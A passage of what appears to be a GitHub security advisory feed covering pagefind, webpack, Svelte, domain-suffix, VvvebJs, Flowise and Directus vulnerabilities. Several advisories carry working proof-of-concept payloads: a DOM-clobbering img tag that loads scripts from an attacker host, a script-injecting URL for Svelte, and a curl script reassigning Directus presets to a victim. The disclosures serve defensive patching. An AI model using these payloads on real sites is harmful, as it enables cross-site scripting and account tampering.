<li><a href="https://github.com/CloudCannon/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb">https://github.com/CloudCannon/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45389">https://nvd.nist.gov/vuln/detail/CVE-2024-45389</a></li>
<li><a href="https://github.com/advisories/GHSA-gprj-6m2f-j9hx">https://github.com/advisories/GHSA-gprj-6m2f-j9hx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gprj-6m2f-j9hx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T19:33:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pagefind] DOM clobbering could escalate to Cross-site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-gprj-6m2f-j9hx</id>
        <link href="https://github.com/advisories/GHSA-gprj-6m2f-j9hx"/>
        <updated>2024-09-03T21:45:33.000Z</updated>
        <content type="html"><![CDATA[<p>Pagefind initializes its dynamic JavaScript and WebAssembly files relative to the location of the first script you load. This information is gathered by looking up the value of <code>document.currentScript.src</code>.</p>
<p>It is possible to "clobber" this lookup with otherwise benign HTML on the page, for example:</p>
<pre><code class="language-html">&lt;img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"&gt;&lt;/img&gt;
</code></pre>
<p>This will cause <code>document.currentScript.src</code> to resolve as an external domain, which will then be used by Pagefind to load dependencies.</p>
<p>This exploit would only work in the case that an attacker could inject HTML to your live, hosted, website. In these cases, this would act as a way to escalate the privilege available to an attacker. This assumes they have the ability to add some elements to the page (for example, <code>img</code> tags with a <code>name</code> attribute), but not others, as adding a <code>script</code> to the page would itself be the XSS vector.</p>
<p>Pagefind has tightened this resolution by ensuring the source is loaded from a valid script element. There are no reports of this being exploited in the wild via Pagefind.</p>
<h3 id="original-report">Original Report</h3>
<p>If an attacker can inject benign html, such as:
<code>&lt;img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"&gt;&lt;/img&gt;</code></p>
<p>they can clobber <code>document.currentScript.src</code> leading to XSS in your library.</p>
<p>Here is the same attack on webpack that was accepted: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CloudCannon/pagefind/security/advisories/GHSA-gprj-6m2f-j9hx">https://github.com/CloudCannon/pagefind/security/advisories/GHSA-gprj-6m2f-j9hx</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://github.com/CloudCannon/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb">https://github.com/CloudCannon/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45389">https://nvd.nist.gov/vuln/detail/CVE-2024-45389</a></li>
<li><a href="https://github.com/advisories/GHSA-gprj-6m2f-j9hx">https://github.com/advisories/GHSA-gprj-6m2f-j9hx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gprj-6m2f-j9hx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T19:33:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webpack] Webpack's AutoPublicPathRuntimeModule has a DOM Clobbering Gadget that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-4vvj-4cpr-p986</id>
        <link href="https://github.com/advisories/GHSA-4vvj-4cpr-p986"/>
        <updated>2024-09-03T17:09:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Webpack’s <code>AutoPublicPathRuntimeModule</code>. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an <code>img</code> tag with an unsanitized <code>name</code> attribute) are present.</p>
<p>We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.</p>
<h3 id="details">Details</h3>
<h4 id="backgrounds">Backgrounds</h4>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<h4 id="gadgets-found-in-webpack">Gadgets found in Webpack</h4>
<p>We identified a DOM Clobbering vulnerability in Webpack’s <code>AutoPublicPathRuntimeModule</code>. When the <code>output.publicPath</code> field in the configuration is not set or is set to <code>auto</code>, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:</p>
<pre><code>/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() =&gt; {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl &amp;&amp; document) {
/******/ 			if (document.currentScript)
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i &gt; -1 &amp;&amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
</code></pre>
<p>However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with <code>document.currentScript</code> can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the <code>src</code> attribute of the attacker-controlled element will be used as the <code>scriptUrl</code> and assigned to <code>__webpack_require__.p</code>. If additional scripts are loaded from the server, <code>__webpack_require__.p</code> will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.</p>
<h3 id="poc">PoC</h3>
<p>Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.</p>
<p>Consider a website developer with the following two scripts, <code>entry.js</code> and <code>import1.js</code>, that are compiled using Webpack:</p>
<pre><code>// entry.js
import('./import1.js')
  .then(module =&gt; {
    module.hello();
  })
  .catch(err =&gt; {
    console.error('Failed to load module', err);
  });
</code></pre>
<pre><code>// import1.js
export function hello () {
  console.log('Hello');
}
</code></pre>
<p>The webpack.config.js is set up as follows:</p>
<pre><code>const path = require('path');

module.exports = {
  entry: './entry.js', // Ensure the correct path to your entry file
  output: {
    filename: 'webpack-gadgets.bundle.js', // Output bundle file
    path: path.resolve(__dirname, 'dist'), // Output directory
    publicPath: "auto", // Or leave this field not set
  },
  target: 'web',
  mode: 'development',
};
</code></pre>
<p>When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the <code>import1.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Webpack Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script src="./dist/webpack-gadgets.bundle.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.</p>
<h3 id="patch">Patch</h3>
<p>A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: <a href="https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174">https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174</a></p>
<pre><code>/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() =&gt; {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl &amp;&amp; document) {
/******/ 			if (document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :&gt;
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i &gt; -1 &amp;&amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
</code></pre>
<p>Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43788">https://nvd.nist.gov/vuln/detail/CVE-2024-43788</a></li>
<li><a href="https://github.com/webpack/webpack/commit/955e057abc6cc83cbc3fa1e1ef67a49758bf5a61">https://github.com/webpack/webpack/commit/955e057abc6cc83cbc3fa1e1ef67a49758bf5a61</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/webpack/webpack/issues/18718#issuecomment-2326296270">https://github.com/webpack/webpack/issues/18718#issuecomment-2326296270</a></li>
<li><a href="https://github.com/advisories/GHSA-4vvj-4cpr-p986">https://github.com/advisories/GHSA-4vvj-4cpr-p986</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vvj-4cpr-p986</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:50:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[svelte] Svelte has a potential mXSS vulnerability due to improper HTML escaping]]></title>
        <id>https://github.com/advisories/GHSA-8266-84wp-wv5c</id>
        <link href="https://github.com/advisories/GHSA-8266-84wp-wv5c"/>
        <updated>2024-08-30T20:01:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A potential XSS vulnerability exists in Svelte for versions prior to 4.2.19.</p>
<h3 id="details">Details</h3>
<p>Svelte improperly escapes HTML on server-side rendering. It converts strings according to the following rules:</p>
<ul>
<li>If the string is an attribute value:<ul>
<li><code>"</code> -&gt; <code>&amp;quot;</code></li>
<li><code>&amp;</code> -&gt; <code>&amp;amp;</code></li>
<li>Other characters -&gt; No conversion</li>
</ul>
</li>
<li>Otherwise:<ul>
<li><code>&lt;</code> -&gt; <code>&amp;lt;</code></li>
<li><code>&amp;</code> -&gt; <code>&amp;amp;</code></li>
<li>Other characters -&gt; No conversion</li>
</ul>
</li>
</ul>
<p>The assumption is that attributes will always stay as such, but in some situation the final DOM tree rendered on browsers is different from what Svelte expects on server-side rendering. This may be leveraged to perform XSS attacks. More specifically, this can occur when injecting malicious content into an attribute within a <code>&lt;noscript&gt;</code> tag.</p>
<h3 id="poc">PoC</h3>
<p>A vulnerable page (<code>+page.svelte</code>):</p>
<pre><code class="language-html">&lt;script&gt;
import { page } from "$app/stores"

// user input
let href = $page.url.searchParams.get("href") ?? "https://example.com";
&lt;/script&gt;

&lt;noscript&gt;
  &lt;a href={href}&gt;test&lt;/a&gt;
&lt;/noscript&gt;
</code></pre>
<p>If a user accesses the following URL,</p>
<pre><code>http://localhost:4173/?href=&lt;/noscript&gt;&lt;script&gt;alert(123)&lt;/script&gt;
</code></pre>
<p>then, <code>alert(123)</code> will be executed.</p>
<h3 id="impact">Impact</h3>
<p>XSS, when using an attribute within a noscript tag</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sveltejs/svelte/security/advisories/GHSA-8266-84wp-wv5c">https://github.com/sveltejs/svelte/security/advisories/GHSA-8266-84wp-wv5c</a></li>
<li><a href="https://github.com/sveltejs/svelte/commit/83e96e044deb5ecbae2af361ae9e31d3e1ac43a3">https://github.com/sveltejs/svelte/commit/83e96e044deb5ecbae2af361ae9e31d3e1ac43a3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45047">https://nvd.nist.gov/vuln/detail/CVE-2024-45047</a></li>
<li><a href="https://github.com/advisories/GHSA-8266-84wp-wv5c">https://github.com/advisories/GHSA-8266-84wp-wv5c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8266-84wp-wv5c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-30T16:49:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[domain-suffix] domain-suffix RegEx Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-cqfh-c4c5-c2hg</id>
        <link href="https://github.com/advisories/GHSA-cqfh-c4c5-c2hg"/>
        <updated>2024-08-29T18:02:24.000Z</updated>
        <content type="html"><![CDATA[<p>RegEx Denial of Service in domain-suffix 1.0.8 allows attackers to crash the application via crafted input to the parse function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25354">https://nvd.nist.gov/vuln/detail/CVE-2024-25354</a></li>
<li><a href="https://gist.github.com/6en6ar/c3b11b4058b8e2bc54717408d451fb79">https://gist.github.com/6en6ar/c3b11b4058b8e2bc54717408d451fb79</a></li>
<li><a href="https://github.com/ikrong/domain-suffix/blob/master/src/domainSuffix.ts">https://github.com/ikrong/domain-suffix/blob/master/src/domainSuffix.ts</a></li>
<li><a href="https://github.com/advisories/GHSA-cqfh-c4c5-c2hg">https://github.com/advisories/GHSA-cqfh-c4c5-c2hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqfh-c4c5-c2hg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-28T00:31:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vvvebjs] VvvebJs Reflected Cross-Site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pc95-3wgm-x28p</id>
        <link href="https://github.com/advisories/GHSA-pc95-3wgm-x28p"/>
        <updated>2024-08-29T18:01:52.000Z</updated>
        <content type="html"><![CDATA[<p>A reflected Cross-Site Scripting (XSS) vulnerability in VvvebJs before version 1.7.5 allows remote attackers to execute arbitrary code and obtain sensitive information via the <code>action</code> parameter in <code>save.php</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29271">https://nvd.nist.gov/vuln/detail/CVE-2024-29271</a></li>
<li><a href="https://github.com/givanz/VvvebJs/issues/342">https://github.com/givanz/VvvebJs/issues/342</a></li>
<li><a href="https://github.com/givanz/VvvebJs/commit/c0c0545b44b23acc288ef907fb498ce15b9b576e">https://github.com/givanz/VvvebJs/commit/c0c0545b44b23acc288ef907fb498ce15b9b576e</a></li>
<li><a href="https://github.com/advisories/GHSA-pc95-3wgm-x28p">https://github.com/advisories/GHSA-pc95-3wgm-x28p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pc95-3wgm-x28p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-22T06:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise Authentication Bypass vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2q4w-x8h2-2fvh</id>
        <link href="https://github.com/advisories/GHSA-2q4w-x8h2-2fvh"/>
        <updated>2024-09-04T17:14:37.000Z</updated>
        <content type="html"><![CDATA[<p>An Authentication Bypass vulnerability exists in Flowise version 1.8.2. This could allow a remote, unauthenticated attacker to access API endpoints as an administrator and allow them to access restricted functionality.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8181">https://nvd.nist.gov/vuln/detail/CVE-2024-8181</a></li>
<li><a href="https://tenable.com/security/research/tra-2024-22-0">https://tenable.com/security/research/tra-2024-22-0</a></li>
<li><a href="https://tenable.com/security/research/tra-2024-33">https://tenable.com/security/research/tra-2024-33</a></li>
<li><a href="https://github.com/advisories/GHSA-2q4w-x8h2-2fvh">https://github.com/advisories/GHSA-2q4w-x8h2-2fvh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2q4w-x8h2-2fvh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-27T15:32:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus has an insecure object reference via PATH presets]]></title>
        <id>https://github.com/advisories/GHSA-3fff-gqw3-vj86</id>
        <link href="https://github.com/advisories/GHSA-3fff-gqw3-vj86"/>
        <updated>2024-08-27T19:54:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Directus v10.13.0 allows an authenticated external attacker to modify presets created by the same user to assign them to another user. This is possible because the application only validates the user parameter in the <code>POST /presets</code> request but not in the PATCH request. When chained with <a href="https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw">CVE-2024-6533</a>, it could result in account takeover.</p>
<p>This vulnerability occurs because the application only validates the user parameter in the <code>POST /presets</code> request but not in the PATCH request.</p>
<h3 id="poc">PoC</h3>
<p>To exploit this vulnerability, we need to do the follow steps using a non-administrative, default role attacker account.</p>
<ol>
<li>Create a preset for a collection.</li>
</ol>
<p>Store the preset id, or use it if it already exists from <code>GET /presets</code>. The following example will use the direct_users preset.</p>
<pre><code class="language-bash">TARGET_HOST="http://localhost:8055" ATTACKER_EMAIL="malicious@malicious.com" ATTACKER_PASSWORD="123456" root_dir=$(dirname $0) mkdir "${root_dir}/static" curl -s -k -o /dev/null -w "%{http_code}" -X 'POST' "${TARGET_HOST}/auth/login" \ -c "${root_dir}/static/attacker_directus_session_token" \ -H 'Content-Type: application/json' \ -d "{\"email\":\"${ATTACKER_EMAIL}\",\"password\":\"${ATTACKER_PASSWORD}\",\"mode\":\"session\"}" attacker_user_id=$(curl -s -k "${TARGET_HOST}/users/me" \ -b "${root_dir}/static/attacker_directus_session_token" | jq -r ".data.id") # Store all user's id curl -s -k "${TARGET_HOST}/users" \ -b "${root_dir}/static/attacker_directus_session_token" | jq -r ".data[] | select(.id != \"${attacker_user_id}\")" &gt; "${root_dir}/static/users.json"

# Choose the victim user id from the previous request
victim_user_id="4f079119-2478-48c4-bd3a-30fa80c5f265"
users_preset_id=$(curl -s -k -X 'POST' "${TARGET_HOST}/presets" \
  -H 'Content-Type: application/json' \
  -b "${root_dir}/static/attacker_directus_session_token" \
  --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${attacker_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"{{tittle}}\",\"subtitle\":\"{{ email }}\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"  | jq -r '.data.id')
</code></pre>
<ol start="2">
<li>Modify the presets via <code>PATCH /presets/{id}</code>.</li>
</ol>
<p>With the malicious configuration and the user ID to which you will assign the preset configuration. The user ID can be obtained from <code>GET /users</code>. The following example modifies the title parameter.</p>
<pre><code class="language-bash">curl -i -s -k -X 'PATCH' "${TARGET_HOST}/presets/${users_preset_id}" \
    -H 'Content-Type: application/json' \
    -b "${root_dir}/static/attacker_directus_session_token" \
    --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${victim_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"PoC Assign another users presets\",\"subtitle\":\"fakeemail@fake.com\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"
</code></pre>
<p>Notes:</p>
<p>Each new preset to a specific collection will have an integer consecutive id independent of the user who created it.</p>
<p>The user is the user id of the victim. The server will not validate that we assign a new user to a preset we own.</p>
<p>The app will use the first id preset with the lowest value it finds for a specific user and collection. If we control a preset with an id lower than the current preset id to the same collection of the victim user, we can attack that victim user, or if the victim has not yet defined a preset for that collection, then the preset id could be any value we control. Otherwise, the attacker user must have permission to modify or create the victim presets.</p>
<p>When the victim visits the views of the modified presets, it will be rendered with the new configuration applied.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-3fff-gqw3-vj86">https://github.com/directus/directus/security/advisories/GHSA-3fff-gqw3-vj86</a></li>
<li><a href="https://github.com/advisories/GHSA-3fff-gqw3-vj86">https://github.com/advisories/GHSA-3fff-gqw3-vj86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3fff-gqw3-vj86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:54:29.000Z</published>
    </entry>
</feed>